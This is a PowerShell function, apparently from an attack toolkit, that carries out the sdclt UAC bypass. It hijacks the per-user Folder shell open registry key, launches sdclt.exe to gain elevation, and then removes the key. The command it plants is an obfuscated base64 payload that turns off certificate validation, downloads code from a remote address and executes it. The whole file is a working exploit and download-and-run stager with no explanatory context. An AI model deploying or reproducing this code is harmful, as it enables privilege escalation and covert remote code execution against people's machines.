# This code was derived from http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass

function bypass {
New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value "powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQATQBTAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAHMAeQBzAHQAZQBtAC4AbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADkAMAAwADEALwBzAHQAYQB0AHUAcwAvADkAOQA1ADUAOQA4ADUAMgAxADMANAAzADUANAAxADIANAA4AC8AcQB1AGUAcgB5AD0ALwBfAHIAcAAnACkAKQApADsASQBFAFgAIAAkAE0AUwA="
New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"
Start-Process -FilePath $env:windir\system32\sdclt.exe
Start-Sleep -s 3
Remove-Item -Path "HKCU:\Software\Classes\Folder" -Recurse
}